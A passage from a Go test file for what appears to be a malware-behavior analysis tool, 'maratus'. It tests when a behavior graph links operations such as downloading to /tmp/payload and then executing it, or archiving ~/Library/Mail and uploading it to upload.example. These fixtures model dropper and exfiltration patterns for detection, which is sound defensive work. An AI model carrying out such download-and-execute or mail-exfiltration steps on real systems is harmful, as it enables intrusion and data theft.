package extract

import (
	"fmt"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func TestLinkOperationRelationsRequiresSharedExecutionContext(t *testing.T) {
	var graph behavior.Graph
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-download",
		Kind:          "network.download", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.Resource{Kind: behavior.ResourceFile, Value: "/tmp/payload"}), behavior.Bind(behavior.ResourceRoleRemoteSource, behavior.NewResource(behavior.ResourceURL, ""))), ScopeID: "scope-download", Execution: testConnectedExecution("root-download"),
	})
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-exec",
		Kind:          "process.execute", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleExecutable, behavior.Resource{Kind: behavior.ResourceFile, Value: "/tmp/payload"})), ScopeID: "scope-exec", Execution: testConnectedExecution("root-exec"),
	})

	linkTestOperationRelations(&graph)

	if len(graph.Relations) != 0 {
		t.Fatalf("operations from different execution roots should not be related: %#v", graph.Relations)
	}
}

func TestLinkOperationRelationsConnectsExactArchiveToLaterUpload(t *testing.T) {
	var graph behavior.Graph
	archiveID := graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: "scope-script",
		Kind: behavior.OperationArchiveCreate,
		ResourceBindings: behavior.Bindings(
			behavior.Bind(behavior.ResourceRoleSource, behavior.NewResource(behavior.ResourceFile, "~/Library/Mail")),
			behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, "/tmp/data.tgz")),
		),
		EvidenceIDs: []string{"ev-archive"}, Support: behavior.SupportCorroborated,
		Execution: testConnectedExecution("root-script"), SourceOrderGroup: 1, SourceOrdinal: 1,
	})
	uploadID := graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: "scope-script",
		Kind: behavior.OperationNetworkUpload,
		ResourceBindings: behavior.Bindings(
			behavior.Bind(behavior.ResourceRoleLocalInput, behavior.NewResource(behavior.ResourceFile, "/tmp/data.tgz")),
			behavior.Bind(behavior.ResourceRoleRemoteDestination, behavior.NewResource(behavior.ResourceURL, "https://upload.example/x")),
		),
		EvidenceIDs: []string{"ev-upload"}, Support: behavior.SupportCorroborated,
		Execution: testConnectedExecution("root-script"), SourceOrderGroup: 1, SourceOrdinal: 2,
	})

	linkTestOperationRelations(&graph)

	if len(graph.Relations) != 3 ||
		!hasRelationBetween(graph.Relations, behavior.RelationPrecedes, archiveID, uploadID) ||
		!hasRelationKind(graph.Relations, behavior.RelationProduces) ||
		!hasRelationKind(graph.Relations, behavior.RelationConsumes) {
		t.Fatalf("archive-to-upload flow = %#v", graph.Relations)
	}
}

func TestLinkOperationRelationsDoesNotGuessArchiveUploadFlow(t *testing.T) {
	for _, test := range []struct {
		name          string
		archiveTarget string
		uploadTarget  string
		archiveOrder  int
		uploadOrder   int
	}{
		{name: "different file", archiveTarget: "/tmp/a.tgz", uploadTarget: "/tmp/b.tgz", archiveOrder: 1, uploadOrder: 2},
		{name: "upload first", archiveTarget: "/tmp/a.tgz", uploadTarget: "/tmp/a.tgz", archiveOrder: 2, uploadOrder: 1},
	} {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			graph.AddOperation(behavior.ModeledOperation{
				SubjectNodeID: "node-script", ScopeID: "scope-script", Kind: behavior.OperationArchiveCreate,
				ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, test.archiveTarget))),
				EvidenceIDs:      []string{"ev-archive"}, Support: behavior.SupportCorroborated,
				Execution: testConnectedExecution("root-script"), SourceOrderGroup: 1, SourceOrdinal: test.archiveOrder,
			})
			graph.AddOperation(behavior.ModeledOperation{
				SubjectNodeID: "node-script", ScopeID: "scope-script", Kind: behavior.OperationNetworkUpload,
				ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalInput, behavior.NewResource(behavior.ResourceFile, test.uploadTarget))),
				EvidenceIDs:      []string{"ev-upload"}, Support: behavior.SupportCorroborated,
				Execution: testConnectedExecution("root-script"), SourceOrderGroup: 1, SourceOrdinal: test.uploadOrder,
			})

			linkTestOperationRelations(&graph)
			if len(graph.Relations) != 0 {
				t.Fatalf("guessed archive-to-upload flow: %#v", graph.Relations)
			}
		})
	}
}

func TestLinkOperationRelationsInvalidatesArchiveUploadAfterInterveningWrite(t *testing.T) {
	for _, test := range []struct {
		name       string
		writerKind behavior.OperationKind
		writerLine int
	}{
		{name: "file write inside interval", writerKind: behavior.OperationFileWrite, writerLine: 2},
		{name: "file copy inside interval", writerKind: behavior.OperationFileCopy, writerLine: 2},
		{name: "unknown writer order", writerKind: behavior.OperationFileWrite, writerLine: 0},
	} {
		t.Run(test.name, func(t *testing.T) {
			var graph behavior.Graph
			writerBindings := behavior.Bindings(
				behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, "/tmp/data.tgz")),
			)
			if test.writerKind == behavior.OperationFileCopy {
				writerBindings = append(writerBindings,
					behavior.Bind(behavior.ResourceRoleSource, behavior.NewResource(behavior.ResourceFile, "/tmp/replacement")),
				)
			}
			graph.AddOperation(behavior.ModeledOperation{
				SubjectNodeID: "node-script", ScopeID: "scope-script", Kind: behavior.OperationArchiveCreate,
				ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, "/tmp/data.tgz"))),
				Execution:        testConnectedExecution("root-script"), Line: 1,
			})
			graph.AddOperation(behavior.ModeledOperation{
				SubjectNodeID: "node-script", ScopeID: "scope-script", Kind: test.writerKind,
				ResourceBindings: writerBindings,
				Execution:        testConnectedExecution("root-script"), Line: test.writerLine,
			})
			graph.AddOperation(behavior.ModeledOperation{
				SubjectNodeID: "node-script", ScopeID: "scope-script", Kind: behavior.OperationNetworkUpload,
				ResourceBindings: behavior.Bindings(
					behavior.Bind(behavior.ResourceRoleLocalInput, behavior.NewResource(behavior.ResourceFile, "/tmp/data.tgz")),
					behavior.Bind(behavior.ResourceRoleRemoteDestination, behavior.NewResource(behavior.ResourceURL, "https://upload.example/x")),
				),
				Execution: testConnectedExecution("root-script"), Line: 3,
			})

			linkTestOperationRelations(&graph)

			if len(graph.Relations) != 0 {
				t.Fatalf("replacement was still attributed to the earlier archive: %#v", graph.Relations)
			}
		})
	}
}

func TestLinkOperationRelationsUsesLatestExactArchiveBeforeUpload(t *testing.T) {
	var graph behavior.Graph
	firstID := graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: "scope-script", Kind: behavior.OperationArchiveCreate,
		ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, "/tmp/data.tgz"))),
		Execution:        testConnectedExecution("root-script"), Line: 1,
	})
	latestID := graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: "scope-script", Kind: behavior.OperationArchiveCreate,
		ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, "/tmp/data.tgz"))),
		Execution:        testConnectedExecution("root-script"), Line: 2,
	})
	uploadID := graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: "scope-script", Kind: behavior.OperationNetworkUpload,
		ResourceBindings: behavior.Bindings(
			behavior.Bind(behavior.ResourceRoleLocalInput, behavior.NewResource(behavior.ResourceFile, "/tmp/data.tgz")),
			behavior.Bind(behavior.ResourceRoleRemoteDestination, behavior.NewResource(behavior.ResourceURL, "https://upload.example/x")),
		),
		Execution: testConnectedExecution("root-script"), Line: 3,
	})

	linkTestOperationRelations(&graph)

	if hasRelationBetween(graph.Relations, behavior.RelationPrecedes, firstID, uploadID) ||
		!hasRelationBetween(graph.Relations, behavior.RelationPrecedes, latestID, uploadID) {
		t.Fatalf("upload was not attributed exclusively to the latest archive: %#v", graph.Relations)
	}
}

func TestLinkOperationRelationsIgnoresArchiveWriteOutsideInterval(t *testing.T) {
	var graph behavior.Graph
	archiveID := graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: "scope-script", Kind: behavior.OperationArchiveCreate,
		ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, "/tmp/data.tgz"))),
		Execution:        testConnectedExecution("root-script"), Line: 2,
	})
	uploadID := graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: "scope-script", Kind: behavior.OperationNetworkUpload,
		ResourceBindings: behavior.Bindings(
			behavior.Bind(behavior.ResourceRoleLocalInput, behavior.NewResource(behavior.ResourceFile, "/tmp/data.tgz")),
			behavior.Bind(behavior.ResourceRoleRemoteDestination, behavior.NewResource(behavior.ResourceURL, "https://upload.example/x")),
		),
		Execution: testConnectedExecution("root-script"), Line: 3,
	})
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: "scope-script", Kind: behavior.OperationFileWrite,
		ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, "/tmp/data.tgz"))),
		Execution:        testConnectedExecution("root-script"), Line: 4,
	})

	linkTestOperationRelations(&graph)

	if !hasRelationBetween(graph.Relations, behavior.RelationPrecedes, archiveID, uploadID) {
		t.Fatalf("write after upload invalidated a proven archive flow: %#v", graph.Relations)
	}
}

func TestLinkOperationRelationsBoundsArchiveInvalidationWork(t *testing.T) {
	var graph behavior.Graph
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: "scope-script", Kind: behavior.OperationArchiveCreate,
		ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, "/tmp/data.tgz"))),
		Execution:        testConnectedExecution("root-script"), Line: 1,
	})
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: "scope-script", Kind: behavior.OperationNetworkUpload,
		ResourceBindings: behavior.Bindings(
			behavior.Bind(behavior.ResourceRoleLocalInput, behavior.NewResource(behavior.ResourceFile, "/tmp/data.tgz")),
			behavior.Bind(behavior.ResourceRoleRemoteDestination, behavior.NewResource(behavior.ResourceURL, "https://upload.example/x")),
		),
		Execution: testConnectedExecution("root-script"), Line: 3,
	})
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: "scope-script", Kind: behavior.OperationFileWrite,
		ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, "/tmp/data.tgz"))),
		Execution:        testConnectedExecution("root-script"), Line: 4,
	})

	linkTestOperationRelationsWithBudget(&graph, 1)

	if len(graph.Relations) != 0 || !hasPartialCoverageScope(graph.Coverage, "operation-relation-linking") {
		t.Fatalf("archive invalidation work exhaustion was not safe and explicit: relations=%#v coverage=%#v", graph.Relations, graph.Coverage)
	}
}

func TestLinkOperationRelationsRejectsSameNodeWithoutContext(t *testing.T) {
	var graph behavior.Graph
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script",
		Kind:          "network.download", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.Resource{Kind: behavior.ResourceFile, Value: "/tmp/payload"}), behavior.Bind(behavior.ResourceRoleRemoteSource, behavior.NewResource(behavior.ResourceURL, ""))),
	})
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script",
		Kind:          "file.make-executable", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleTarget, behavior.Resource{Kind: behavior.ResourceFile, Value: "/tmp/payload"})),
	})
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script",
		Kind:          "process.execute", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleExecutable, behavior.Resource{Kind: behavior.ResourceFile, Value: "/tmp/payload"})),
	})

	linkTestOperationRelations(&graph)

	if len(graph.Relations) != 0 {
		t.Fatalf("same-node operations without explicit context should not be related: %#v", graph.Relations)
	}
}

func TestLinkOperationRelationsDoesNotCrossFunctionArchitectures(t *testing.T) {
	var graph behavior.Graph
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-macho",
		Kind:          "network.download", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.Resource{Kind: behavior.ResourceFile, Value: "/tmp/payload"}), behavior.Bind(behavior.ResourceRoleRemoteSource, behavior.NewResource(behavior.ResourceURL, ""))), SourceFunction: "install",
		Architecture: "arm64",
	})
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-macho",
		Kind:          "process.execute", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleExecutable, behavior.Resource{Kind: behavior.ResourceFile, Value: "/tmp/payload"})), SourceFunction: "install",
		Architecture: "x86_64",
	})

	linkTestOperationRelations(&graph)

	if len(graph.Relations) != 0 {
		t.Fatalf("same-function operations from different architecture slices should not be related: %#v", graph.Relations)
	}
}

func TestLinkOperationRelationsDoesNotTreatSharedRootAsCrossScopeDataflow(t *testing.T) {
	var graph behavior.Graph
	programScopeID := graph.AddScope(behavior.Scope{NodeID: "node-script", Kind: "program"})
	downloadScopeID := graph.AddScope(behavior.Scope{NodeID: "node-script", ParentID: programScopeID, Kind: "function", Function: "download"})
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script",
		Kind:          "network.download", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.Resource{Kind: behavior.ResourceFile, Value: "/tmp/payload"}), behavior.Bind(behavior.ResourceRoleRemoteSource, behavior.NewResource(behavior.ResourceURL, ""))), SourceFunction: "download",
		ScopeID: downloadScopeID, Execution: testConnectedExecution("root-script"),
	})
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script",
		Kind:          "process.execute", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleExecutable, behavior.Resource{Kind: behavior.ResourceFile, Value: "/tmp/payload"})), ScopeID: programScopeID, Execution: testConnectedExecution("root-script"),
	})

	linkTestOperationRelations(&graph)

	if len(graph.Relations) != 0 {
		t.Fatalf("a shared execution root alone must not prove data flow across scopes: %#v", graph.Relations)
	}
}

func TestLinkOperationRelationsUsesExplicitDirectFunctionCallScope(t *testing.T) {
	var graph behavior.Graph
	programScopeID := graph.AddScope(behavior.Scope{NodeID: "node-script", Kind: "program"})
	downloadScopeID := graph.AddScope(behavior.Scope{NodeID: "node-script", ParentID: programScopeID, Kind: "function", Function: "download"})
	graph.AddFeature(behavior.Feature{
		NodeID: "node-script", ScopeID: programScopeID, Key: "script.function_call", Value: "download",
		EvidenceIDs: []string{"ev-call"}, Execution: testConnectedExecution("root-script"), Support: behavior.SupportDirect,
	})
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: downloadScopeID, SourceFunction: "download",
		Kind: "network.download", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.Resource{Kind: behavior.ResourceFile, Value: "/tmp/payload"}), behavior.Bind(behavior.ResourceRoleRemoteSource, behavior.NewResource(behavior.ResourceURL, ""))), Execution: testConnectedExecution("root-script"),
		SourceOrderGroup: 1, SourceOrdinal: 1,
	})
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: programScopeID, Kind: "process.execute", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleExecutable, behavior.Resource{Kind: behavior.ResourceFile, Value: "/tmp/payload"})), Execution: testConnectedExecution("root-script"),
		SourceOrderGroup: 1, SourceOrdinal: 2,
	})

	linkTestOperationRelations(&graph)

	if len(graph.Relations) != 4 || !hasRelationKind(graph.Relations, behavior.RelationCalls) || !hasRelationKind(graph.Relations, behavior.RelationPrecedes) {
		t.Fatalf("explicit caller-to-function relation should permit the operation path: %#v", graph.Relations)
	}
}

func TestLinkOperationRelationsDoesNotUseFunctionDefinitionLinesAsCallSiteOrder(t *testing.T) {
	var graph behavior.Graph
	programScopeID := graph.AddScope(behavior.Scope{NodeID: "node-script", Kind: "program"})
	downloadScopeID := graph.AddScope(behavior.Scope{
		NodeID: "node-script", ParentID: programScopeID, Kind: "function", Function: "download",
	})
	graph.AddFeature(behavior.Feature{
		NodeID: "node-script", ScopeID: programScopeID, Key: "script.function_call", Value: "download",
		EvidenceIDs: []string{"ev-call"}, Execution: testConnectedExecution("root-script"), Support: behavior.SupportDirect,
	})
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: downloadScopeID, SourceFunction: "download",
		Kind: "network.download", ResourceBindings: behavior.Bindings(
			behavior.Bind(behavior.ResourceRoleRemoteSource, behavior.NewResource(behavior.ResourceURL, "https://example.invalid/payload")),
			behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, "/tmp/payload")),
		),
		EvidenceIDs: []string{"ev-download"}, Execution: testConnectedExecution("root-script"), Support: behavior.SupportCorroborated,
		Line: 2,
	})
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: programScopeID,
		Kind: "process.execute", ResourceBindings: behavior.Bindings(
			behavior.Bind(behavior.ResourceRoleExecutable, behavior.NewResource(behavior.ResourceFile, "/tmp/payload")),
		),
		EvidenceIDs: []string{"ev-exec"}, Execution: testConnectedExecution("root-script"), Support: behavior.SupportCorroborated,
		Line: 8,
	})

	linkTestOperationRelations(&graph)

	if !hasRelationKind(graph.Relations, behavior.RelationCalls) {
		t.Fatalf("direct call evidence was lost: %#v", graph.Relations)
	}
	if hasRelationKind(graph.Relations, behavior.RelationPrecedes) ||
		hasRelationKind(graph.Relations, behavior.RelationProduces) ||
		hasRelationKind(graph.Relations, behavior.RelationConsumes) {
		t.Fatalf("function definition order became call-site dataflow: %#v", graph.Relations)
	}
}

func TestLinkOperationRelationsDoesNotCompareLineNumbersAcrossSourceScopes(t *testing.T) {
	var graph behavior.Graph
	outerScopeID := graph.AddScope(behavior.Scope{NodeID: "node-script", Kind: "program"})
	decodedScopeID := graph.AddScope(behavior.Scope{
		NodeID: "node-script", ParentID: outerScopeID, Kind: "function", Function: "decoded",
	})
	graph.AddRelation(behavior.OperationRelation{
		Kind:        behavior.RelationCalls,
		From:        behavior.IDRelationEndpoint(behavior.RelationEndpointScope, outerScopeID),
		To:          behavior.IDRelationEndpoint(behavior.RelationEndpointScope, decodedScopeID),
		EvidenceIDs: []string{"ev-call"}, Support: behavior.SupportDirect,
		Execution: testConnectedExecution("root-script"),
	})
	downloadID := graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: decodedScopeID,
		Kind: behavior.OperationNetworkDownload,
		ResourceBindings: behavior.Bindings(
			behavior.Bind(behavior.ResourceRoleRemoteSource, behavior.NewResource(behavior.ResourceURL, "https://example.invalid/payload")),
			behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, "/tmp/payload")),
		),
		EvidenceIDs: []string{"ev-download"}, Support: behavior.SupportCorroborated,
		Execution: testConnectedExecution("root-script"), Line: 1,
		SourceOrderGroup: 1, SourceOrdinal: 1,
	})
	execID := graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: outerScopeID,
		Kind: behavior.OperationProcessExecute,
		ResourceBindings: behavior.Bindings(
			behavior.Bind(behavior.ResourceRoleExecutable, behavior.NewResource(behavior.ResourceFile, "/tmp/payload")),
		),
		EvidenceIDs: []string{"ev-exec"}, Support: behavior.SupportCorroborated,
		Execution: testConnectedExecution("root-script"), Line: 20,
		SourceOrderGroup: 1, SourceOrdinal: 1,
	})

	linkTestOperationRelations(&graph)

	if hasRelationBetween(graph.Relations, behavior.RelationPrecedes, downloadID, execID) {
		t.Fatalf("independent scope line coordinates became source order: %#v", graph.Relations)
	}
}

func TestLinkDirectCallsPromotesFeatureWithoutRemovingIt(t *testing.T) {
	var graph behavior.Graph
	caller := graph.AddScope(behavior.Scope{NodeID: "node-script", Kind: "program"})
	callee := graph.AddScope(behavior.Scope{NodeID: "node-script", Kind: "function", Function: "download"})
	graph.AddFeature(behavior.Feature{
		NodeID: "node-script", ScopeID: caller, Key: "script.function_call", Value: "download",
		EvidenceIDs: []string{"ev-call"}, Support: behavior.SupportDirect, Execution: testConnectedExecution("root-script"),
	})

	LinkDirectCalls(&graph)

	if len(graph.Features) != 1 || len(graph.Relations) != 1 {
		t.Fatalf("feature promotion = features %#v, relations %#v", graph.Features, graph.Relations)
	}
	relation := graph.Relations[0]
	if relation.Kind != behavior.RelationCalls || relation.From.ID != caller || relation.To.ID != callee || relation.Support != behavior.SupportDirect || len(relation.EvidenceIDs) != 1 || relation.EvidenceIDs[0] != "ev-call" {
		t.Fatalf("calls relation = %#v", relation)
	}
}

func TestLinkDirectCallsRejectsArchitectureMismatchAndMissingEvidence(t *testing.T) {
	var graph behavior.Graph
	caller := graph.AddScope(behavior.Scope{NodeID: "node-macho", Kind: "function", Function: "main", Architecture: "arm64"})
	graph.AddScope(behavior.Scope{NodeID: "node-macho", Kind: "function", Function: "helper", Architecture: "x86_64"})
	graph.AddFeature(behavior.Feature{
		NodeID: "node-macho", ScopeID: caller, Key: "macho.function_call", Value: "helper",
		EvidenceIDs: []string{"ev-call"}, Support: behavior.SupportCorroborated, Execution: testConnectedExecution("root-main"),
	})
	graph.AddScope(behavior.Scope{NodeID: "node-macho", Kind: "function", Function: "unproved", Architecture: "arm64"})
	graph.AddFeature(behavior.Feature{
		NodeID: "node-macho", ScopeID: caller, Key: "macho.function_call", Value: "unproved",
		Support: behavior.SupportCorroborated, Execution: testConnectedExecution("root-main"),
	})

	LinkDirectCalls(&graph)

	if len(graph.Relations) != 0 {
		t.Fatalf("unproved call relation was retained: %#v", graph.Relations)
	}
}

func TestLinkDirectCallsBoundsCandidateWork(t *testing.T) {
	var graph behavior.Graph
	caller := graph.AddScope(behavior.Scope{NodeID: "node-script", Kind: "program"})
	for i := 0; i < 3; i++ {
		function := fmt.Sprintf("helper-%d", i)
		graph.AddScope(behavior.Scope{NodeID: "node-script", Kind: "function", Function: function})
		graph.AddFeature(behavior.Feature{
			NodeID: "node-script", ScopeID: caller, Key: "script.function_call", Value: function,
			EvidenceIDs: []string{fmt.Sprintf("ev-call-%d", i)}, Support: behavior.SupportDirect, Execution: testConnectedExecution("root-script"),
		})
	}

	linkDirectCalls(&graph, 2)

	if len(graph.Relations) != 2 || !hasPartialCoverageScope(graph.Coverage, "direct-call-linking") {
		t.Fatalf("bounded direct-call promotion = relations %#v, coverage %#v", graph.Relations, graph.Coverage)
	}
}

func TestLinkDirectCallsRejectsAmbiguousCalleeScopes(t *testing.T) {
	var graph behavior.Graph
	caller := graph.AddScope(behavior.Scope{NodeID: "node-script", Kind: "program"})
	graph.AddScope(behavior.Scope{NodeID: "node-script", Kind: "function", Function: "helper"})
	graph.AddScope(behavior.Scope{NodeID: "node-script", Kind: "function", Function: "helper"})
	graph.AddFeature(behavior.Feature{
		NodeID: "node-script", ScopeID: caller, Key: "script.function_call", Value: "helper",
		EvidenceIDs: []string{"ev-call"}, Support: behavior.SupportDirect, Execution: testConnectedExecution("root-script"),
	})

	LinkDirectCalls(&graph)

	if len(graph.Relations) != 0 || !hasPartialCoverageScope(graph.Coverage, "direct-call-linking") {
		t.Fatalf("ambiguous direct-call target was related or omitted silently: relations=%#v coverage=%#v", graph.Relations, graph.Coverage)
	}
}

func TestLinkOperationRelationsDoesNotJoinSiblingFunctionCalls(t *testing.T) {
	var graph behavior.Graph
	programScopeID := graph.AddScope(behavior.Scope{NodeID: "node-script", Kind: "program"})
	downloadScopeID := graph.AddScope(behavior.Scope{NodeID: "node-script", ParentID: programScopeID, Kind: "function", Function: "download"})
	executeScopeID := graph.AddScope(behavior.Scope{NodeID: "node-script", ParentID: programScopeID, Kind: "function", Function: "execute"})
	for _, function := range []string{"download", "execute"} {
		graph.AddFeature(behavior.Feature{
			NodeID: "node-script", ScopeID: programScopeID, Key: "script.function_call", Value: function,
			Execution: testConnectedExecution("root-script"), Support: behavior.SupportDirect,
		})
	}
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: downloadScopeID, SourceFunction: "download",
		Kind: "network.download", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.Resource{Kind: behavior.ResourceFile, Value: "/tmp/payload"}), behavior.Bind(behavior.ResourceRoleRemoteSource, behavior.NewResource(behavior.ResourceURL, ""))), Execution: testConnectedExecution("root-script"),
	})
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script", ScopeID: executeScopeID, SourceFunction: "execute",
		Kind: "process.execute", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleExecutable, behavior.Resource{Kind: behavior.ResourceFile, Value: "/tmp/payload"})), Execution: testConnectedExecution("root-script"),
	})

	linkTestOperationRelations(&graph)

	if len(graph.Relations) != 0 {
		t.Fatalf("separate functions called by one parent do not prove cross-function data flow: %#v", graph.Relations)
	}
}

func TestLinkOperationRelationsNormalizesSimpleRelativePathsInSharedEntrypoint(t *testing.T) {
	var graph behavior.Graph
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script",
		Kind:          "network.download", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.Resource{Kind: behavior.ResourceFile, Value: "./payload"}), behavior.Bind(behavior.ResourceRoleRemoteSource, behavior.NewResource(behavior.ResourceURL, ""))), ScopeID: "scope-script", Execution: testConnectedExecution("root-script"),
		Line: 1, WorkingDirectoryContext: 1,
	})
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script",
		Kind:          "file.make-executable", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleTarget, behavior.Resource{Kind: behavior.ResourceFile, Value: "payload"})), ScopeID: "scope-script", Execution: testConnectedExecution("root-script"),
		Line: 2, WorkingDirectoryContext: 1,
	})
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script",
		Kind:          "process.execute", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleExecutable, behavior.Resource{Kind: behavior.ResourceFile, Value: "./payload"})), ScopeID: "scope-script", Execution: testConnectedExecution("root-script"),
		Line: 3, WorkingDirectoryContext: 1,
	})

	linkTestOperationRelations(&graph)

	if len(graph.Relations) != 5 || !hasRelationKind(graph.Relations, behavior.RelationProduces) || !hasRelationKind(graph.Relations, behavior.RelationConsumes) || !hasRelationKind(graph.Relations, behavior.RelationPrecedes) {
		t.Fatalf("expected simple relative path spellings to produce a typed operation path: %#v", graph.Relations)
	}
}

func TestLinkOperationRelationsRequiresDownloadBeforeExecuteWhenLinesKnown(t *testing.T) {
	var graph behavior.Graph
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script",
		Kind:          "process.execute", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleExecutable, behavior.Resource{Kind: behavior.ResourceFile, Value: "/tmp/payload"})), ScopeID: "scope-script", Execution: testConnectedExecution("root-script"),
		Line: 1,
	})
	graph.AddOperation(behavior.ModeledOperation{
		SubjectNodeID: "node-script",
		Kind:          "network.download", ResourceBindings: behavior.Bindings(behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.Resource{Kind: behavior.ResourceFile, Value: "/tmp/payload"}), behavior.Bind(behavior.ResourceRoleRemoteSource, behavior.NewResource(behavior.ResourceURL, ""))), ScopeID: "scope-script", Execution: testConnectedExecution("root-script"),
		Line: 2,
	})

	linkTestOperationRelations(&graph)

	if len(graph.Relations) != 0 {
		t.Fatalf("execute-before-download should not be related: %#v", graph.Relations)
	}
}

func TestLinkOperationRelationsRequiresProvenOrderWithinOneSourceLine(t *testing.T) {
	newOperation := func(kind behavior.OperationKind, ordinal int) behavior.ModeledOperation {
		bindings := behavior.Bindings(
			behavior.Bind(behavior.ResourceRoleExecutable, behavior.NewResource(behavior.ResourceFile, "/tmp/payload")),
		)
		if kind == behavior.OperationNetworkDownload {
			bindings = behavior.Bindings(
				behavior.Bind(behavior.ResourceRoleRemoteSource, behavior.NewResource(behavior.ResourceURL, "https://example.invalid/payload")),
				behavior.Bind(behavior.ResourceRoleLocalOutput, behavior.NewResource(behavior.ResourceFile, "/tmp/payload")),
			)
		}
		return behavior.ModeledOperation{
			SubjectNodeID:    "node-script",
			ScopeID:          "scope-script",
			Kind:             kind,
			ResourceBindings: bindings,
			Execution:        testConnectedExecution("root-script"),
			Line:             1,
			SourceOrderGroup: 1,
			SourceOrdinal:    ordinal,
		}
	}

	t.Run("forward", func(t *testing.T) {
		var graph behavior.Graph
		graph.AddOperation(newOperation(behavior.OperationNetworkDownload, 1))
		graph.AddOperation(newOperation(behavior.OperationProcessExecute, 2))
		linkTestOperationRelations(&graph)
		if !hasRelationKind(graph.Relations, behavior.RelationPrecedes) {
			t.Fatalf("forward same-line operation order was lost: %#v", graph.Relations)
		}
	})

	t.Run("reverse", func(t *testing.T) {
		var graph behavior.Graph
		graph.AddOperation(newOperation(behavior.OperationProcessExecute, 1))
		graph.AddOperation(newOperation(behavior.OperationNetworkDownload, 2))
		linkTestOperationRelations(&graph)
		if len(graph.Relations) != 0 {
			t.Fatalf("reverse same-line operation order became a download/execute path: %#v", graph.Relations)
		}
	})

